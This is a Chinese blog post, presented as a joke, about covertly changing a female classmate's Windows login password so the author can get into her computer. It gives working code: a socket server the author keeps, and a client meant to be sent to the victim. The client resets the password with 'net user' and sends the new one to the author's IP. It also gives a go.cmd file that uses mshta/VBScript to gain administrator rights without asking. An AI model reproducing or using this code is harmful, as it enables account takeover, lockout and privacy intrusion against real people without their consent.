
--- 
title:  我用Python修改了班花的开机密码，重新登录后竟然发现了她的秘密！ 
tags: []
categories: [] 

---
<img src="https://img-blog.csdnimg.cn/img_convert/f832c281ee99a801e328d156bf9c9e69.png">

>  
  作者：五包辣条！ 
  https://blog.csdn.net/AI19970205/article/details/117417156 
 

## 前言

<img src="https://img-blog.csdnimg.cn/img_convert/3d7b8f8cee31a2115207e68bdbcfdb94.png">班花加我说她电话坏了让我看看，那肯定义不容辞！【兴奋了半个小时】没别的我就想秀一下技术！五分钟后我修好了，电脑重启之后显示输入密码，当时没多想直接走了。回去之后我能不能用技术远程解析一下这个开机密码呢，说干就干。

## 工具准备

开发环境：win10、python3.7开发工具：pycharm

## 项目思路解析

一想到远程，就想到创建连接，一想到创建链接，就想到socket套接字（一想到套接字，就联想到我没有女朋）<img src="https://img-blog.csdnimg.cn/img_convert/d76971207470d9c2f56d15b35eb23ba9.png">

该项目代码为3份（记住自己拿的是服务端的代码，客服端代码和go.cmd是发给别人的）

首先正常流程创建服务端的服务服务端流程：
- 创建套接字-绑定ip和端口-设置监听-等待链接-接受数据打印数据-关闭链接
```
    import socket  # 导入socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 创建socket
    server.bind(('192.168.246.1', 44444))  # 绑定IP/端口
    server.listen(5)  # 监听
    print('***********等待连接*********')
    conn, addr = server.accept()  # 连接
    print(conn) 
    print('客户端的地址:', addr)
    client_msg = conn.recv(1024)
    print('客户端修改的密码是: %s' % client_msg)
    conn.close()
    server.close()

```

windows的修改电脑密码的命令：net User 用户名 修改的密码(可以自己动手试一下)<img src="https://img-blog.csdnimg.cn/img_convert/cd18a91500ca48dbfb94e5218c7675d5.png">

客户端流程：
- 创建套接字-连接服务端的IP和端口-获取当前使用的电脑账户名-生成随机的电脑密码-在终端执行修改Windows密码的指令-发送修改之后的密码-关闭套接字
```
    import socket  # 导入用到的模块
    import getpass
    import subprocess
    import random
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 创建socket实例
    client.connect((ip, 端口))  # 连接server端IP地址/端口按你自己实际情况来
    user = getpass.getuser()  # 获取计算机用户名
    print(user)
    psd = ''
    for j in range(1, 9): # 生成1-9的随机数
        m = str(random.randrange(0, 10))
        psd = psd + m
    
    subprocess.Popen(['net', 'User', user, psd])  # 在本地执行（类似于cmd命令）
    client.send(psd.encode('utf-8'))  # 将密码发送给server端
    back_msg = client.recv(1024)
    client.close()  # 关闭socket

```

到这一步基本就可以自己去尝试了，但是要注意，当前代码只能修改权限是admin的账户。<img src="https://img-blog.csdnimg.cn/img_convert/f8012a3766f533c473d36e8700edad88.png">
- 还在翻呢！！！！！！！！**************************下面会有怎么修改非admin的内容嘛？？？？？？*****************
非admin用户需要提高自己的执行权限直接使用超级管理员权限执行cmd文件go.cmd

```
    @echo off
    %1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&amp;&amp;exit
    cd /d "%~dp0"
    
    start python client.py

```

## 小结

最后我修改密码成功登陆，竟然发现了她的密码！

<img src="https://img-blog.csdnimg.cn/img_convert/2038842899687a85549da1e8c745ba9f.png">这铁憨憨C盘满了都不知道清理，一看就是不太懂电脑的亚子！班花那么好看竟然不太懂电脑，真是惊人的发现哩！

**PS：最后我啥都没动改回去了！仅供学习技术交流！切勿违法违纪！本人不承担一切后果！**
